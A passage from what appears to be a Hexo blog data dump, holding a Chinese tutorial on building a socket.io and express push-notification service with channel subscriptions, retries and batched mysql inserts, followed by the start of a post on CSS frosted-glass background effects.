class=\"literal\">true</span> &#125; ) )</span><br></pre></td></tr></table></figure>\n<p>html端post取到了，后面模拟真实后端post，又取不到了，原来是格式原因，<code>jquery</code>默认了我们的json格式于是以application/json的格式post，而后端的post是以<code>form</code>的格式post，于是又引入了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> connectMultiparty = <span class=\"built_in\">require</span>( <span class=\"string\">'connect-multiparty'</span> )</span><br><span class=\"line\">app.post( <span class=\"string\">'/publish'</span>, connectMultiparty(), routerHandler.publish( io ) )</span><br></pre></td></tr></table></figure>\n<p>这样来处理form数据，真是坎坷啊。</p>\n<p>以上则是服务端的大致情况，当然，这仅仅是能完成推送服务，还有在线人数统计等需要慢慢完善的功能。<br>\n客户端的代码则相当简单了，提供一个订阅函数就好了，并且在代码里记得<code>ws</code>断线重连后重新login，不然就接收不到消息了。<br>\n完整的代码整理后会放到github，敬请期待~ 😄</p>\n","site":{"data":{}},"excerpt":"","more":"<p>上一次说<code>websocket</code>还是在“<a href=\"/2017/09/12/page-parallel-execute\">解决Websocket并发执行的问题</a>”这篇文章，不过提到的内容是在不同标签页的消息同时到来时的处理方式，不过治标不治本，还是有几率出现重复推送的问题，而且这样的代码也不是很严谨，所以这个问题只能从服务端着手了。其实在很早之前就看过<code>goeasy</code>这个第三方推送服务的<code>client</code>源码，当时就吐槽它们代码之烂，二次封装的代码居然直接修改了<code>socket.io</code>（goeasy是基于nodejs的开源库<a href=\"http://socket.io\" target=\"_blank\" rel=\"noopener\">socket.io</a>来做的）的源码，然后添加了自己的代码，再将<code>goeasy</code>构造函数强行暴露给window，据说是为了适配不同了浏览器要求一定要动态引用他们的js代码，我猜应该是做了cdn处理吧，可恶的是还拒绝缓存，所以有时候会造成我们网站一直等待goeasy的js代码。扯远了，还是说说我们自己如何去构建一个基于channel的推送服务吧。</p>\n<p><code>socoket.io</code>这个库把自己封装得更像是一个聊天室，甚至里面的有属性也命名为<code>room</code>（若理解错误还请轻喷）。我们的网页应用更侧重于按用户id接收来自服务器的消息推送，因为可能存在多个标签页，所以就可能反复的订阅消息，这也是导致上面我的提到的重复推送的问题，因为我们是基于h5的<code>Notification</code>来做的，网页一旦都接收消息，就会出现几个标签页，收到几次桌面通知的问题。所以，我也是直接吸收了goeasy的设计思路，直接按channel来订阅和发送消息。文档都是摆在那儿的，网上零零碎碎的教程也不系统化，还是只能看官方文档，英语不到位也只能看会儿机翻的结果再适当切回去。</p>\n<p>我采用的是<code>socket.io + express 4</code>的模式，其实要将二者结合起来还是非常简单的</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> app = <span class=\"built_in\">require</span>( <span class=\"string\">'express'</span> )();</span><br><span class=\"line\"><span class=\"keyword\">var</span> server = <span class=\"built_in\">require</span>( <span class=\"string\">'http'</span> ).createServer( app );</span><br><span class=\"line\"><span class=\"keyword\">var</span> io = <span class=\"built_in\">require</span>( <span class=\"string\">'socket.io'</span> )( server );</span><br><span class=\"line\">server.listen( <span class=\"number\">3000</span> );</span><br></pre></td></tr></table></figure>\n<p>主要还是在<code>io</code>这里，我们需要处理来自客户端的连接事件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io.on( <span class=\"string\">'connection'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> socket </span>) </span>&#123;</span><br><span class=\"line\">  socket</span><br><span class=\"line\">    .on( <span class=\"string\">'login'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> &#123; channel, socketDeviceID &#125; </span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"comment\">// 这里至关重要，我们用这个标记这个连接是否来自同一个浏览器</span></span><br><span class=\"line\">      socket.socketDeviceID = socketDeviceID</span><br><span class=\"line\">      <span class=\"comment\">// 将这个连接合并到channel这个频道，也就是用户id</span></span><br><span class=\"line\">      socket.join( channel )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">    .on( <span class=\"string\">'message'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> content </span>) </span>&#123;</span><br><span class=\"line\">      messageSend( io, content )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>其实这里很简单，就是监听客户端连接，然后再监听当前连接的login事件，再自动合并相同用户的连接。<br>\n为了方便理解再贴上客户端代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> io <span class=\"keyword\">from</span> <span class=\"string\">'socket.io-client'</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> socket = io( <span class=\"string\">'localhost:3000'</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">soket.emit( <span class=\"string\">'login'</span>, &#123;</span><br><span class=\"line\">  channel: <span class=\"string\">'user1'</span>,</span><br><span class=\"line\">  socketDeviceID: <span class=\"string\">'xxxxxxx'</span> <span class=\"comment\">// 这里是一个随机字符串，反正能尽量保证当前浏览器的唯一性就好了</span></span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>客户端也很简单吧。<br>\n其实麻烦的是我们要处理消息的发送就是上面的<code>messageSend</code>函数要做的事，<code>content</code>的结构因该是</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"channel\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"content\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"ak\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>用户id，发送内容和<code>application key</code>，ak是为了防止别人恶意调用。<br>\n上面的<code>message</code>事件只是为了后面的客户端提交，我们的程序服务端要发送事件应该提供更友好的发送方式，所以我们就需要一个url来提供api形式的推送<code>express</code>的路由就不赘述了，因为不是本篇文章的讲述内容。下面是<code>/publish</code>接口的处理函数</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">messageSend( io, &#123; channel, content, ak &#125; ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ak !== <span class=\"string\">'ak'</span> ) <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve( <span class=\"number\">10001</span> )</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !channel || !content ) <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve( <span class=\"number\">10002</span> )</span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; event &#125; = <span class=\"keyword\">typeof</span> content !== <span class=\"string\">'object'</span> ? <span class=\"built_in\">JSON</span>.parse( content ) : content</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class=\"line\">    io.to( channel ).clients( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> err, clients </span>) </span>&#123;</span><br><span class=\"line\">      err &amp;&amp; reject( err )</span><br><span class=\"line\">      <span class=\"keyword\">let</span> &#123; connected &#125; = io.of( <span class=\"string\">'/'</span> )</span><br><span class=\"line\">      <span class=\"keyword\">let</span> promiseArray = []</span><br><span class=\"line\">      <span class=\"comment\">// 我们在这里单独处理message类型的事件</span></span><br><span class=\"line\">      <span class=\"comment\">// ps: 推往客户端的内容有一个规范，event字段为必须项，用来描述内容的类型，messge|refresh等</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( event === <span class=\"string\">'message'</span> ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> names = &#123;&#125;</span><br><span class=\"line\">        <span class=\"comment\">// 在这里将来自同一个浏览器的连接进行合并，取最后连接上的那个连接</span></span><br><span class=\"line\">        clients.forEach( <span class=\"function\"><span class=\"params\">item</span> =&gt;</span> names[ connected[ item ].socketDeviceID ] = item )</span><br><span class=\"line\">        <span class=\"comment\">// 填充消息进行发送</span></span><br><span class=\"line\">        promiseArray = <span class=\"built_in\">Object</span>.keys( names ).map( <span class=\"function\"><span class=\"params\">key</span> =&gt;</span> messageEmit( connected[ names[ key ] ], channel, content ) )</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        promiseArray = clients.map( <span class=\"function\"><span class=\"params\">clientId</span> =&gt;</span> messageEmit( connected[ clientId ], channel, content ) )</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// 将消息一并发送出去 </span></span><br><span class=\"line\">      <span class=\"comment\">// TODO，应将0以外的消息进行筛选</span></span><br><span class=\"line\">      <span class=\"built_in\">Promise</span>.all( promiseArray ).then( <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> resolve( <span class=\"number\">0</span> ) )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125; )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是对消息的发送对象进行处理，下面是发送逻辑</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 发送消息，延迟N秒后告知发送失败</span></span><br><span class=\"line\"><span class=\"comment\"> * @param &#123;*&#125; socket </span></span><br><span class=\"line\"><span class=\"comment\"> * @param &#123;*&#125; content </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">messageEmit</span>(<span class=\"params\"> socket, channel, content </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; event &#125; = <span class=\"keyword\">typeof</span> content !== <span class=\"string\">'object'</span> ? <span class=\"built_in\">JSON</span>.parse( content ) : content</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pushDBData</span>(<span class=\"params\"> status </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> platform = channel.substr( channel.lastIndexOf( <span class=\"string\">'_'</span> ) + <span class=\"number\">1</span> )</span><br><span class=\"line\">    <span class=\"comment\">// 将消息发送结果存入等待持久化的队列</span></span><br><span class=\"line\">    pushArrayAdd( &#123;</span><br><span class=\"line\">      channel,</span><br><span class=\"line\">      status,</span><br><span class=\"line\">      send_content: <span class=\"built_in\">JSON</span>.stringify( content ),</span><br><span class=\"line\">      push_date: <span class=\"built_in\">Date</span>.now(),</span><br><span class=\"line\">      event_type: event,</span><br><span class=\"line\">      platform</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve </span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> retry = retryTimes</span><br><span class=\"line\">    <span class=\"keyword\">let</span> timeID = setTimeout( <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sendTimeout</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !retry ) &#123;</span><br><span class=\"line\">        resolve( <span class=\"number\">10000</span> )</span><br><span class=\"line\">        pushDBData( <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        retry--</span><br><span class=\"line\">        sendTimeout()</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log( <span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>&#125;</span>用户“<span class=\"subst\">$&#123;channel&#125;</span>”消息发送超时`</span> )</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;, sendTimeout )</span><br><span class=\"line\">    socket.emit( <span class=\"string\">'message'</span>, content, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      resolve( <span class=\"number\">0</span> )</span><br><span class=\"line\">      clearTimeout( timeID )</span><br><span class=\"line\">      pushDBData( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125; ).catch( <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123; <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>( err ) &#125; )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对消息发送，超出时间未收到客户端的响应递归尝试N次，一直失败则判定为失败。这里的10000和0都是对接口请求者的响应码。<br>\n接下来是对发送记录的入库</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.pushArrayAdd = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> pushItem </span>) </span>&#123;</span><br><span class=\"line\">  pushArray.push( pushItem )</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( pushArray.length &gt;= <span class=\"number\">100</span> ) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">`插入数据库<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>&#125;</span>`</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 每一百条数据清空一次</span></span><br><span class=\"line\">    staistical.insertPushRecord( _.cloneDeep( pushArray ) )</span><br><span class=\"line\">    pushArray = []</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>pushArray</code>肯定是一个单例模式的数据，也就是我们的<code>dataStore</code>，我们肯定不能发一条就存一条，这也不专业，定时储存或达到一个量再储存是比较为数据库着想的。如果消息推送得少我们可以再启动一个定时器定时去清空一次这个队列，防止数据过久存放在内存里导致更新不及时，或服务重启导致的数据丢失。<br>\n接下来就是数据库的写入操作了，nodejs发展到今天生态已经很好了，对mysql进行操作的包与其同名，不过操作起来感觉还是过于简陋，对于<code>connection</code>都是手动拿手动释放。不过连接池这一块貌似很方便。期间用到了非常非常多的回调，mysql这个包也没有提供Promise返回（我猜的，官方推荐是回调的形式），还好我用的nodejs版本比较高，我便优雅的全部封装成Promise返回了，方便我调用，于是像<code>query、insert</code>这样的函数我就直接声明成<code>asycn</code>函数了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> mysql = <span class=\"built_in\">require</span>( <span class=\"string\">'mysql'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; <span class=\"attr\">mysql</span>: mysqlConfig &#125; = <span class=\"built_in\">require</span>( <span class=\"string\">'../config'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> pool = mysql.createPool( mysqlConfig )</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 获取连接池中的连接</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DBBase</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 获取数据库连接</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  getConnection() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class=\"line\">      pool.getConnection( <span class=\"function\">(<span class=\"params\"> err, connection </span>) =&gt;</span> ( err ? reject( err ) : resolve( connection ) ) )</span><br><span class=\"line\">    &#125; ).catch( <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log( err )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 查询记录</span></span><br><span class=\"line\"><span class=\"comment\">   * </span></span><br><span class=\"line\"><span class=\"comment\">   * @param &#123;*&#125; sql </span></span><br><span class=\"line\"><span class=\"comment\">   * @param &#123;*&#125; condition </span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">async</span> query( sql, condition ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> con = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.getConnection()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class=\"line\">      con.query( sql, condition, ( err, result ) =&gt; &#123;</span><br><span class=\"line\">        err ? reject( err ) : resolve( result )</span><br><span class=\"line\">        con.release()</span><br><span class=\"line\">      &#125; )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 插入记录</span></span><br><span class=\"line\"><span class=\"comment\">   * </span></span><br><span class=\"line\"><span class=\"comment\">   * @param &#123;*&#125; sql </span></span><br><span class=\"line\"><span class=\"comment\">   * @param &#123;*&#125; dataArray </span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  insert( sql, dataArray ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.query( sql, [ dataArray ] )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是所有需要有数据库操作的对象的基类，这样一来我所有的操作就不用再去手动取连接，用完再释放了，下面是继承它的子类的一些简单操作</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StatisticalDao</span> <span class=\"keyword\">extends</span> <span class=\"title\">DBBase</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">async</span> insertPushRecord( arr ) &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertData = arr.map( <span class=\"function\"><span class=\"params\">item</span> =&gt;</span> ( [</span><br><span class=\"line\">      item.push_date,</span><br><span class=\"line\">      item.send_content,</span><br><span class=\"line\">      item.status,</span><br><span class=\"line\">      item.channel,</span><br><span class=\"line\">      item.event_type,</span><br><span class=\"line\">      item.platform</span><br><span class=\"line\">    ] ) )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.insert( <span class=\"string\">`insert into bigwe_notification_records( </span></span><br><span class=\"line\"><span class=\"string\">      push_date, </span></span><br><span class=\"line\"><span class=\"string\">      send_content, </span></span><br><span class=\"line\"><span class=\"string\">      status,</span></span><br><span class=\"line\"><span class=\"string\">      channel,</span></span><br><span class=\"line\"><span class=\"string\">      event_type,</span></span><br><span class=\"line\"><span class=\"string\">      platform</span></span><br><span class=\"line\"><span class=\"string\">    ) values ?`</span>,</span><br><span class=\"line\">      insertData )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"keyword\">new</span> StatisticalDao()</span><br></pre></td></tr></table></figure>\n<p>哈，Dao的结尾命名纯属情怀，想起了写java的时光。这里的<code>insertPushRecord</code>方法就是上面对队列里的数据操作时调用的方法，批量插入数据。<br>\n其实在接收来此接口请求者post过来的数据的时候还有点小插曲，先是get取得到post取不到于是加了这句</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> bodyParser = <span class=\"built_in\">require</span>( <span class=\"string\">'body-parser'</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">app.use( bodyParser.json() )</span><br><span class=\"line\">app.use( bodyParser.urlencoded( &#123; <span class=\"attr\">extended</span>: <span class=\"literal\">true</span> &#125; ) )</span><br></pre></td></tr></table></figure>\n<p>html端post取到了，后面模拟真实后端post，又取不到了，原来是格式原因，<code>jquery</code>默认了我们的json格式于是以application/json的格式post，而后端的post是以<code>form</code>的格式post，于是又引入了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> connectMultiparty = <span class=\"built_in\">require</span>( <span class=\"string\">'connect-multiparty'</span> )</span><br><span class=\"line\">app.post( <span class=\"string\">'/publish'</span>, connectMultiparty(), routerHandler.publish( io ) )</span><br></pre></td></tr></table></figure>\n<p>这样来处理form数据，真是坎坷啊。</p>\n<p>以上则是服务端的大致情况，当然，这仅仅是能完成推送服务，还有在线人数统计等需要慢慢完善的功能。<br>\n客户端的代码则相当简单了，提供一个订阅函数就好了，并且在代码里记得<code>ws</code>断线重连后重新login，不然就接收不到消息了。<br>\n完整的代码整理后会放到github，敬请期待~ 😄</p>\n"},{"title":"在web页面实现IOS的毛玻璃背景效果","catalog":true,"date":"2017-10-03T16:02:41.000Z","subtitle":null,"header-img":"post/2017100323131019.jpg","_content":"在写这篇文章之前，的我认知还停留在web页面里是无法做到像`ios`和`MAC`下那种毛玻璃效果的，虽然我知道`filter`属性，但是因为它是通过改变整个容器的失焦而不是透明背景的高斯模糊。\n\n今天要讲述的是两个能达到这种背景模糊效果的方法\n1. `backdrop-filter`属性;\n2. 通过`filter`属性配合双重背景图达到背景图能够模糊，包括滚动的时候也有背景模糊效果\n\n`backdrop-filter`属性其实是一个草案中的属性，所以鲜为人知。但是chrome早在2016年的49版本就支持这个属性了，但默认是关闭的，可能多方面的原因使得这个属性不被默认打开，比如性能问题、草案中、实现效果等。\n开启方法是在地址输入`chrome://flags/`，找到`Experimental Web Platform features `，点击启用后重启浏览器。\n虽然提案中，但是还是无法阻止我们追求美的决心。下面是开启后的效果。\n<div style=\"padding: 50px 50px;color: #fff;text-align: center;font-size: 30px;background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;position: relative;\">\n  <div style=\"position: absolute;top: 10px;width: 100%;\">我<br/>被<br/>盖<br/>住<br/>啦</div>\n  <p style=\"padding: 50px 0;backdrop-filter:blur(10px);background-color: rgba(0,0,0,.2)\">Experimental Web Platform</p>\n</div>\n\n效果是不是很赞，如果您使用的不是chrome，那么下面是预览效果截图\n\n![效果图](20171004172449.jpg)\n当然了，这种办法肯定是不能用到生产环境中的，因为除了mac和ios下的safari默认支持，其余所有浏览器要么不支持，要么默认关闭，于是下面这个办法就能兼容大多数浏览器，先来看看效果\n<style type=\"text/css\">\n  .bg-demo{\n    position: relative;\n  }\n  .bg-demo:after{\n    content: ' ';\n    background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;\n    position: absolute;\n    left: 0;top:0;\n    height: 100%;\n    width: 100%;\n    display: block;\n    filter: blur(10px);\n  }\n  .bg-demo:before{\n    content: ' ';\n    position: absolute;\n    left: 0;top:0;\n    height: 100%;\n    width: 100%;\n    background-color: rgba(0,0,0,.1);\n    z-index: 1;\n  }\n  .bg-demo p{position: relative;z-index: 1;margin:0}\n</style>\n<div style=\"padding: 80px 50px;color: #fff;text-align: center;font-size: 30px;background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;position: 